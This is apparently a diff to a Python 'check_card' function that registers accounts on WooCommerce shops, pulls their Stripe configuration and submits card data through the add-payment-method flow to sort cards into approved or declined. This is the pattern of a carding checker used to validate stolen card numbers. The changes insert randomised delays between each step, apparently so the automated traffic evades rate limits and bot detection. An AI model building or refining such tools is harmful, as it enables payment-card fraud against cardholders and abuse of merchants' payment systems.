@@ -156,6 +156,7 @@ def check_card(cc_line, proxy_dict=None):
             yy = f'20{yy}'
 
         session = _setup_session(proxy_dict)
+        time.sleep(random.uniform(0.5, 1.5))
 
         # Step 1: Get registration page
         reg_page = session.get(f'{site}/my-account/', timeout=20)
@@ -200,6 +201,7 @@ def check_card(cc_line, proxy_dict=None):
             '_wp_http_referer': '/my-account/', 'register': 'Register',
         }
 
+        time.sleep(random.uniform(0.5, 1.5))
         reg_resp = session.post(f'{site}/my-account/', data=reg_data, timeout=20)
 
         if 'woocommerce-error' in reg_resp.text:
@@ -210,6 +212,8 @@ def check_card(cc_line, proxy_dict=None):
             elif 'recaptcha' in reg_resp.text.lower():
                 return "Error | reCAPTCHA required"
 
+        # Step 2: Get payment page
+        time.sleep(random.uniform(1, 2))
         pay_page = session.get(f'{site}/my-account/add-payment-method/', timeout=20)
 
         # Extract Stripe config
@@ -240,6 +244,8 @@ def check_card(cc_line, proxy_dict=None):
             return "Error | Stripe config not found"
 
         # Step 3: Create payment method on Stripe
+        time.sleep(random.uniform(1, 2))
+
         sessionid = str(uuid.uuid4())
         guid_val = str(uuid.uuid4())
         muid_val = str(uuid.uuid4())
@@ -297,6 +303,8 @@ def check_card(cc_line, proxy_dict=None):
             return f"Declined | {error_msg} | {elapsed}s"
 
         # Step 4: Submit setup intent
+        time.sleep(random.uniform(1, 2))
+
         if MultipartEncoder:
             mp = MultipartEncoder({
                 'action': 'create_setup_intent',
